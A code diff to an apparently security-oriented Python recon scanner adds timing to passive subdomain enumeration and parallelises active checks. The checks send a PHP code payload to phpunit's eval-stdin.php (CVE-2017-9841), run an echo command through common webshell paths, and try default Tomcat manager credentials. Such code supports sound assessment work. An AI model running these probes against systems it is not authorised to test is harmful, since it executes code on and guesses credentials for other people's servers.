@@ -1242,37 +1242,54 @@ async def gated_hosts(session, d, sem):
 
 async def passive(domains):
     found, jobs, sem = set(), [], asyncio.Semaphore(15)
+    tP = {}
     gated = [k for k in ("PD_API_KEY", "ST_API_KEY", "VT_API_KEY", "SHODAN_KEY")
              if os.environ.get(k)]
     if gated:
         print(f"      key-gated sources: {', '.join(gated)}", flush=True)
+
+    async def _t(name, coro):
+        tt = time.time()
+        try:
+            return await coro
+        finally:
+            tP[name] = max(tP.get(name, 0.0), round(time.time() - tt, 1))
+
     async with xsession() as s:
+        t0 = time.time()
         idx = await cc_index(s, sem)
+        tP["ccindex"] = round(time.time() - t0, 1)
         if idx:
             print(f"      common crawl index: {idx}", flush=True)
         for d in domains:
             jobs += [
-                fetch(s, f"https://crt.sh/?q=%25.{d}&output=json", 25, sem),
-                fetch(s, f"https://api.hackertarget.com/hostsearch/?q={d}", 15, sem),
-                fetch(s, f"https://api.subdomain.center/?domain={d}", 15, sem),
-                fetch(s, f"https://api.certspotter.com/v1/issuances?domain={d}"
-                         f"&include_subdomains=true&expand=dns_names", 15, sem),
-                fetch(s, f"https://urlscan.io/api/v1/search/?q=domain:{d}&size=100", 15, sem),
-                fetch(s, f"https://web.archive.org/cdx/search/cdx?url={d}&matchType=domain"
-                         f"&fl=original&collapse=urlkey&limit=5000", 20, sem),
-                fetch(s, f"https://otx.alienvault.com/api/v1/indicators/domain/{d}/passive_dns"
-                         f"?limit=5000", 20, sem),
-                fetch(s, f"https://api.mnemonic.no/pdns/v3/{d}?limit=5000", 20, sem),
-                fetch(s, f"https://rapiddns.io/subdomain/{d}?full=1", 25, sem),
-                fetch(s, f"https://jldc.me/anubis/subdomains/{d}", 15, sem),
-                fetch(s, f"https://api.threatminer.org/v2/domain.php?q={d}&rt=5",
-                      15, sem),
-                fetch(s, f"https://dns.bufferover.run/q=.domain{d}", 15, sem),
-                cc_hosts(s, idx, d, sem) if idx else None,
-                gated_hosts(s, d, sem),
+                ("crtsh", fetch(s, f"https://crt.sh/?q=%25.{d}&output=json", 25, sem)),
+                ("hackertarget", fetch(s, f"https://api.hackertarget.com/hostsearch/?q={d}", 15, sem)),
+                ("subdomainc", fetch(s, f"https://api.subdomain.center/?domain={d}", 15, sem)),
+                ("certspotter", fetch(s, f"https://api.certspotter.com/v1/issuances?domain={d}"
+                                         f"&include_subdomains=true&expand=dns_names", 15, sem)),
+                ("urlscan", fetch(s, f"https://urlscan.io/api/v1/search/?q=domain:{d}&size=100", 15, sem)),
+                ("wayback", fetch(s, f"https://web.archive.org/cdx/search/cdx?url={d}&matchType=domain"
+                                     f"&fl=original&collapse=urlkey&limit=5000", 20, sem)),
+                ("otx", fetch(s, f"https://otx.alienvault.com/api/v1/indicators/domain/{d}/passive_dns"
+                                 f"?limit=5000", 20, sem)),
+                ("mnemonic", fetch(s, f"https://api.mnemonic.no/pdns/v3/{d}?limit=5000", 20, sem)),
+                ("rapiddns", fetch(s, f"https://rapiddns.io/subdomain/{d}?full=1", 25, sem)),
+                ("anubis", fetch(s, f"https://jldc.me/anubis/subdomains/{d}", 15, sem)),
+                ("threatminer", fetch(s, f"https://api.threatminer.org/v2/domain.php?q={d}&rt=5",
+                                      15, sem)),
+                ("bufferover", fetch(s, f"https://dns.bufferover.run/q=.domain{d}", 15, sem)),
+                ("gated", gated_hosts(s, d, sem)),
             ]
-        results = await asyncio.gather(*[j for j in jobs if j],
+            if idx:
+                jobs.append(("commoncrawl", cc_hosts(s, idx, d, sem)))
+        results = await asyncio.gather(*[_t(n, j) for n, j in jobs],
                                        return_exceptions=True)
+    if tP:
+        print("      [timing] passive: "
+              + " ".join(f"{k}={tP[k]}s"
+                         for k in sorted(tP, key=lambda x: tP[x], reverse=True)),
+              flush=True)
     for text in results:
         # one failing source API must not kill the whole passive pass
         if not text or isinstance(text, BaseException):
@@ -7405,113 +7422,126 @@ async def file_leaks(session, host, findings):
                         break
         except Exception:
             continue
-    for p in SENS_FILES:
-        for scheme in ("https", "http"):
-            try:
-                async with HTTP_SEM:
-                    async with session.get(f"{scheme}://{host}{p}", headers=UA,
-                                           timeout=aiohttp.ClientTimeout(total=6),
-                                           ssl=False, allow_redirects=False) as r:
-                        if r.status != 200:
-                            continue
-                        body = await r.content.read(200_000)
-                        if leak_ok(p, body):
-                            if p == "/.DS_Store":
-                                names = dsstore_names(body)
-                                if len(names) >= 3:
+    psem = asyncio.Semaphore(6)
+
+    async def sens_check(p):
+        async with psem:
+            for scheme in ("https", "http"):
+                try:
+                    async with HTTP_SEM:
+                        async with session.get(f"{scheme}://{host}{p}", headers=UA,
+                                               timeout=aiohttp.ClientTimeout(total=6),
+                                               ssl=False, allow_redirects=False) as r:
+                            if r.status != 200:
+                                continue
+                            body = await r.content.read(200_000)
+                            if leak_ok(p, body):
+                                if p == "/.DS_Store":
+                                    names = dsstore_names(body)
+                                    if len(names) >= 3:
+                                        findings.append(
+                                            f"[DSSTORE] {scheme}://{host}{p} parses - "
+                                            f"{len(names)} dir entries leaked (e.g. "
+                                            f"{', '.join(names[:5])})")
+                                        break
+                                _spec = SENS_TAG.get(p)
+                                if _spec:
                                     findings.append(
-                                        f"[DSSTORE] {scheme}://{host}{p} parses - "
-                                        f"{len(names)} dir entries leaked (e.g. "
-                                        f"{', '.join(names[:5])})")
-                                    break
-                            _spec = SENS_TAG.get(p)
-                            if _spec:
+                                        f"[{_spec[0]}] {scheme}://{host}{p} {_spec[1]}")
+                                else:
+                                    findings.append(
+                                        f"[LEAK] {scheme}://{host}{p} (200, {len(body)}B)")
+                            break
+                except Exception:
+                    continue
+    async def phpunit_check(p):
+        # phpunit eval-stdin (CVE-2017-9841): the endpoint evals the raw POST
+        # body - executing our marker proves unauthenticated RCE
+        done = False
+        async with psem:
+            for scheme in ("https", "http"):
+                if done:
+                    break
+                try:
+                    async with HTTP_SEM:
+                        async with session.post(
+                                f"{scheme}://{host}{p}", headers=UA,
+                                data=b'<?php echo "sxeRceOk7"; ?>',
+                                timeout=aiohttp.ClientTimeout(total=6),
+                                ssl=False, allow_redirects=False) as r:
+                            if r.status == 200 and b"sxeRceOk7" in (
+                                    await r.content.read(8000)):
                                 findings.append(
-                                    f"[{_spec[0]}] {scheme}://{host}{p} {_spec[1]}")
-                            else:
+                                    f"[PHPUNIT-RCE] {scheme}://{host}{p} evals "
+                                    f"the POST body (CVE-2017-9841) - "
+                                    f"unauthenticated remote code execution")
+                                done = True
+                except Exception:
+                    continue
+    async def shell_check(p):
+        # webshell files: a live shell echoes our canary command output - the
+        # strongest possible evidence (command actually executed)
+        done = False
+        async with psem:
+            for scheme in ("https", "http"):
+                if done:
+                    break
+                try:
+                    async with HTTP_SEM:
+                        async with session.get(
+                                f"{scheme}://{host}{p}?cmd=echo+sxeShell77",
+                                headers=UA, timeout=aiohttp.ClientTimeout(total=6),
+                                ssl=False, allow_redirects=False) as r:
+                            if r.status == 200 and b"sxeShell77" in (
+                                    await r.content.read(8000)):
                                 findings.append(
-                                    f"[LEAK] {scheme}://{host}{p} (200, {len(body)}B)")
+                                    f"[SHELL-EXEC] {scheme}://{host}{p} executes "
+                                    f"shell commands (canary echoed) - live "
+                                    f"webshell, host is owned")
+                                done = True
+                except Exception:
+                    continue
+    async def tomcat_check():
+        # tomcat manager default creds: a200 manager page behind basic auth
+        # with a factory-default pair = unauthenticated code deploy
+        done = False
+        async with psem:
+            for user, pw in (("admin", "admin"), ("tomcat", "s3cret"),
+                             ("admin", "s3cret"), ("tomcat", "tomcat")):
+                if done:
+                    break
+                auth = aiohttp.BasicAuth(user, pw)
+                for scheme in ("https", "http"):
+                    if done:
                         break
-            except Exception:
-                continue
-    # phpunit eval-stdin (CVE-2017-9841): the endpoint evals the raw POST
-    # body - executing our marker proves unauthenticated RCE
-    for p in ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
-              "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php"):
-        done = False
-        for scheme in ("https", "http"):
-            if done:
-                break
-            try:
-                async with HTTP_SEM:
-                    async with session.post(
-                            f"{scheme}://{host}{p}", headers=UA,
-                            data=b'<?php echo "sxeRceOk7"; ?>',
-                            timeout=aiohttp.ClientTimeout(total=6),
-                            ssl=False, allow_redirects=False) as r:
-                        if r.status == 200 and b"sxeRceOk7" in (
-                                await r.content.read(8000)):
-                            findings.append(
-                                f"[PHPUNIT-RCE] {scheme}://{host}{p} evals "
-                                f"the POST body (CVE-2017-9841) - "
-                                f"unauthenticated remote code execution")
-                            done = True
-            except Exception:
-                continue
-    # webshell files: a live shell echoes our canary command output - the
-    # strongest possible evidence (command actually executed)
-    for p in ("/cmd.php", "/shell.php", "/wso.php", "/webshell.php",
-              "/backdoor.php", "/c99.php"):
-        done = False
-        for scheme in ("https", "http"):
-            if done:
-                break
-            try:
-                async with HTTP_SEM:
-                    async with session.get(
-                            f"{scheme}://{host}{p}?cmd=echo+sxeShell77",
-                            headers=UA, timeout=aiohttp.ClientTimeout(total=6),
-                            ssl=False, allow_redirects=False) as r:
-                        if r.status == 200 and b"sxeShell77" in (
-                                await r.content.read(8000)):
-                            findings.append(
-                                f"[SHELL-EXEC] {scheme}://{host}{p} executes "
-                                f"shell commands (canary echoed) - live "
-                                f"webshell, host is owned")
-                            done = True
-            except Exception:
-                continue
-    # tomcat manager default creds: a200 manager page behind basic auth
-    # with a factory-default pair = unauthenticated code deploy
-    done = False
-    for user, pw in (("admin", "admin"), ("tomcat", "s3cret"),
-                     ("admin", "s3cret"), ("tomcat", "tomcat")):
-        if done:
-            break
-        auth = aiohttp.BasicAuth(user, pw)
-        for scheme in ("https", "http"):
-            if done:
-                break
-            try:
-                async with HTTP_SEM:
-                    async with session.get(
-                            f"{scheme}://{host}/manager/html",
-                            headers=UA, auth=auth,
-                            timeout=aiohttp.ClientTimeout(total=6),
-                            ssl=False, allow_redirects=False) as r:
-                        if r.status != 200:
-                            continue
-                        body = await r.content.read(60_000)
-                        if (b"Tomcat Web Application Manager" in body
-                                or b"Manager App" in body):
-                            findings.append(
-                                f"[TOMCAT-DEFAULT] {scheme}://{host}"
-                                f"/manager/html accepts default creds "
-                                f"{user}:{pw} - unauthenticated WAR deploy "
-                                f"is remote code execution")
-                            done = True
-            except Exception:
-                continue
+                    try:
+                        async with HTTP_SEM:
+                            async with session.get(
+                                    f"{scheme}://{host}/manager/html",
+                                    headers=UA, auth=auth,
+                                    timeout=aiohttp.ClientTimeout(total=6),
+                                    ssl=False, allow_redirects=False) as r:
+                                if r.status != 200:
+                                    continue
+                                body = await r.content.read(60_000)
+                                if (b"Tomcat Web Application Manager" in body
+                                        or b"Manager App" in body):
+                                    findings.append(
+                                        f"[TOMCAT-DEFAULT] {scheme}://{host}"
+                                        f"/manager/html accepts default creds "
+                                        f"{user}:{pw} - unauthenticated WAR "
+                                        f"deploy is remote code execution")
+                                    done = True
+                    except Exception:
+                        continue
+
+    await asyncio.gather(
+        *[sens_check(p) for p in SENS_FILES],
+        *[phpunit_check(p) for p in ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+                                     "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php")],
+        *[shell_check(p) for p in ("/cmd.php", "/shell.php", "/wso.php",
+                                   "/webshell.php", "/backdoor.php", "/c99.php")],
+        tomcat_check())
 
 
 # ---------------- phase 10: takeover ----------------
